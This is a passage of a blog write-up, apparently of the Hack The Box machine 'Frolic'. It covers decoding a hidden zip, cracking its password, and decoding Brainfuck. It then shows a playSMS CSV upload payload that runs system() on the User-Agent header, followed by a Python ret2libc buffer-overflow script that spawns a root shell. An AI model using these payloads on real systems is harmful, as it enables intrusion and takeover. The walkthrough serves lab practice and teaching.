+<h3 id="x2F-asdiSIAJJ0QWE9JAS"><a href="#x2F-asdiSIAJJ0QWE9JAS" class="headerlink" title="&#x2F;asdiSIAJJ0QWE9JAS"></a>&#x2F;asdiSIAJJ0QWE9JAS</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhir_bwZCuZobw3QmWs2g_mIwDEK.png"></p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
+UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
+BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
+K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
+EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
+lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
+AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
+AAAAAAEAAQBPAAAAAwEAAAAA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It like a zip file</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd
+00000000: 504b 0304 1400 0900 0800 c389 374d 23fe  PK..........7M#.
+00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e  <span class="token punctuation">[</span>.....i.......in
+00000020: 6465 782e 7068 7055 5409 0003 857c a75b  dex.phpUT....|.<span class="token punctuation">[</span>
+00000030: 857c a75b 7578 0b00 0104 0000 0000 0400  .|.<span class="token punctuation">[</span>ux..........
+00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b  ...^D..J.s.h.)..
+00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc  .P.n...Ss..Jw...
+00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8  ...4....k.z...U.
+00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea  ..+X...P........
+00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea  ...x_..N.<span class="token punctuation">[</span>...S..
+00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0  8......J2S.*..D.
+000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4  .<span class="token punctuation">&#125;</span>.8dT.Q.k......
+000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2  .j_.......'x.c..
+000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95  ...t..75Q.......
+000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609  .k.,4..b).4F....
+000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4  .........<span class="token punctuation">&amp;</span>q2o.W.
+000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069  ..9PK..#.<span class="token punctuation">[</span>.....i
+00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3  ...PK...........
+00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009  .7M#.<span class="token punctuation">[</span>.....i....
+00000120: 0018 0000 0000 0001 0000 00a4 8100 0000  ................
+00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385  .index.phpUT....
+00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000  |.<span class="token punctuation">[</span>ux...........
+00000150: 0000 504b 0506 0000 0000 0100 0100 4f00  ..PK..........O.
+00000160: 0000 0301 0000 0000                      ........<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">></span> index.php.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjD336Vw2nn2nnlH0hkr4XxgaiIj.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fcrackzip <span class="token parameter variable">-u</span> <span class="token parameter variable">-D</span> <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt index.php.zip
+
+password: password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqGNBtYYQ2nxQrzghKA5Sk_b--Yl.png"></p>
+<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> index.php
+4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Use <code>xxd</code> to read that back to bytes, which happens to be not only ASCII, but base64 characters:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> index.php <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span>
+KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
+KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
+K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>There are some \r\n in there that will screw up base64. I’ll remove them, and decode:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> index.php <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\r\n'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span>
++++++ +++++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ +++++ +++<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>++++ +.--- --.++ +++++ .<span class="token operator">&lt;</span>+++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ +<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+
+++.<span class="token operator">&lt;</span>+ ++<span class="token punctuation">[</span>-<span class="token operator">></span> ---<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>---- --.-- ----- .<span class="token operator">&lt;</span>+++ +<span class="token punctuation">[</span>-<span class="token operator">></span>+ +++<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>+++. <span class="token operator">&lt;</span>+++<span class="token punctuation">[</span> -<span class="token operator">></span>---
+<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>-- .<span class="token operator">&lt;</span>+++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ +<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+ .---. <span class="token operator">&lt;</span>+++<span class="token punctuation">[</span> -<span class="token operator">></span>--- <span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>-- ----. <span class="token operator">&lt;</span>++++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ ++<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>
+++<span class="token punctuation">..</span><span class="token operator">&lt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtzsnmLJjSYAbp-AjkkO_ZdhALV-.png"></p>
+<h2 id="www-data-shell"><a href="#www-data-shell" class="headerlink" title="www-data shell"></a>www-data shell</h2><p>Public vulnerbility in playsms<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42044/">https://www.exploit-db.com/exploits/42044/</a></p>
+<p><code>book.csv</code></p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">Name,Mobile,Email,Group code,Tags
+&lt;?php <span class="token equation string">$t=$</span>_SERVER<span class="token punctuation">[</span>'HTTP_USER_AGENT'<span class="token punctuation">]</span>; system($t); ?>,2,,,
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvK-4WMO4bfVQAoR6GQGk2KnVn-1.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtIWlAqNWbb_-4z3i4PH_nehbfal.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkYA-3aZIdvm3CjzbDkT8CZEkxF9.png"></p>
+<h2 id="Priv-escalation"><a href="#Priv-escalation" class="headerlink" title="Priv escalation"></a>Priv escalation</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FheS7zOHVwdmoWiDGTCf_MTHq3Mm.png"></p>
+<p>Transfer the binary with <code>nc</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmKnB4IMZpaYN4zfUifwEKOLVJ74.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq6wFxJWiWtWrqKQ6knHbmRyRURb.png"></p>
+<p>We can use <code>gdb</code> to observe the binary, and I find the vulnable function.<br>It will be <strong>overflowed</strong> if we input more the 0x30 characters when we attack the binary.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoQQFYRC1EDTYLWN46DL9f4d03Fk.png"></p>
+<p>Locate the offset<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtUrpHOIy-hFFX8Fc3BLKfQi6lkU.png"></p>
+<p>Check what <code>lib</code>version in the machine. We can find the function basic offset.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuwsjLKrNkjfJb3ffu2kTDNOBUi1.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python2</span>
+<span class="token keyword">import</span> struct
+offset <span class="token operator">=</span> <span class="token number">52</span>
+elf_address <span class="token operator">=</span> <span class="token number">0xb7e19000</span>
+system_addr <span class="token operator">=</span> elf_address <span class="token operator">+</span> <span class="token number">0x0003ada0</span>
+exit_addr <span class="token operator">=</span> elf_address <span class="token operator">+</span> <span class="token number">0x0002e9d0</span>
+str_bin_sh <span class="token operator">=</span> elf_address <span class="token operator">+</span> <span class="token number">0x15ba0b</span>
+
+<span class="token comment"># print('system_addr: ' + system_addr)</span>
+<span class="token comment"># print('exit_addr: ' + elf_address)</span>
+<span class="token comment"># print('str_bin_sh' + str_bin_sh)</span>
+
+payload <span class="token operator">=</span> <span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'A'</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span>exit_addr<span class="token punctuation">)</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span>str_bin_sh<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsvtxGgcX5LJ-Jrjv2EwZ9aawxMo.png"></p>
+<p>we can <code>redirect</code> the output to the file.</p>
+<p>upload the payload, and run the <code>rop</code> with <code>$(cat payload)</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtLpfknXvZDec4zuwbaFyMFqNe7q.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scan"><span class="toc-number">1.</span> <span class="toc-text">Port Scan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">1.1.</span> <span class="toc-text">SMB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-Red-TCP-1880"><span class="toc-number">2.</span> <span class="toc-text">Node-Red - TCP 1880</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-contents-discovery"><span class="toc-number">4.</span> <span class="toc-text">Web contents discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#playsms"><span class="toc-number">5.</span> <span class="toc-text">playsms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#String-decryption"><span class="toc-number">6.</span> <span class="toc-text">String decryption</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin"><span class="toc-number">6.1.</span> <span class="toc-text">admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#success-html"><span class="toc-number">6.2.</span> <span class="toc-text">success.html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x2F-asdiSIAJJ0QWE9JAS"><span class="toc-number">6.3.</span> <span class="toc-text">&#x2F;asdiSIAJJ0QWE9JAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#index-php"><span class="toc-number">6.4.</span> <span class="toc-text">index.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#www-data-shell"><span class="toc-number">7.</span> <span class="toc-text">www-data shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-escalation"><span class="toc-number">8.</span> <span class="toc-text">Priv escalation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[20].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[20].html&text=HTB Frolic"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[20].html&is_video=false&description=HTB Frolic"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Frolic&body=Check out this article: http://kelpie.top/post/Virtual%20Attack[20].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[20].html&name=HTB Frolic&description=&lt;h2 id=&#34;Port-Scan&#34;&gt;&lt;a href=&#34;#Port-Scan&#34; class=&#34;headerlink&#34; title=&#34;Port Scan&#34;&gt;&lt;/a&gt;Port Scan&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-latex&#34; data-language=&#34;latex&#34;&gt;&lt;code class=&#34;language-latex&#34;&gt;# Nmap 7.93 scan initiated Thu Dec 15 09:06:29 2022 as: nmap -p- -A --min-rate 10000 -oN portscan.txt 10.10.10.111
+Nmap scan report for 10.10.10.111
+Host is up (0.26s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 877b912a0f11b6571ecb9f77cf35e221 (RSA)
+|   256 b79b06ddc25e284478411e677d1eb762 (ECDSA)
+|_  256 21cf166d82a430c3c69cd738bab502b0 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1880/tcp open  http        Node.js (Express middleware)
+|_http-title: Node-RED
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93&lt;span class=&#34;token comment&#34;&gt;%E=4%D=12/15%OT=22%CT=1%CU=33070%PV=Y%DS=2%DC=T%G=Y%TM=639B2A&lt;/span&gt;
+OS:26&lt;span class=&#34;token comment&#34;&gt;%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(SP=&lt;/span&gt;
+OS:108&lt;span class=&#34;token comment&#34;&gt;%GCD=1%ISR=10B%TI=Z%II=I%TS=8)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%II=I&lt;/span&gt;
+OS:&lt;span class=&#34;token comment&#34;&gt;%TS=8)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11N&lt;/span&gt;
+OS:W7&lt;span class=&#34;token comment&#34;&gt;%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120&lt;/span&gt;
+OS:&lt;span class=&#34;token comment&#34;&gt;%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539&lt;/span&gt;
+OS:NNSNW7&lt;span class=&#34;token comment&#34;&gt;%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R&lt;/span&gt;
+OS:=Y&lt;span class=&#34;token comment&#34;&gt;%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=&lt;/span&gt;
+OS:AR&lt;span class=&#34;token comment&#34;&gt;%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=&lt;/span&gt;
+OS:40&lt;span class=&#34;token comment&#34;&gt;%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID&lt;/span&gt;
+OS:=G&lt;span class=&#34;token comment&#34;&gt;%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)&lt;/span&gt;
+
+Network Distance: 2 hops
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &amp;lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: frolic
+|   NetBIOS computer name: FROLIC&lt;span class=&#34;token function selector&#34;&gt;\x&lt;/span&gt;00
+|   Domain name: &lt;span class=&#34;token function selector&#34;&gt;\x&lt;/span&gt;00
+|   FQDN: frolic
+|_  System time: 2022-12-15T19:37:25+05:30
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time:
+|   date: 2022-12-15T14:07:26
+|_  start_date: N/A
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   254.76 ms 10.10.14.1
+2   254.86 ms 10.10.10.111
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Dec 15 09:07:34 2022 -- 1 IP address (1 host up) scanned in 64.79 seconds
+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[20].html&t=HTB Frolic"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
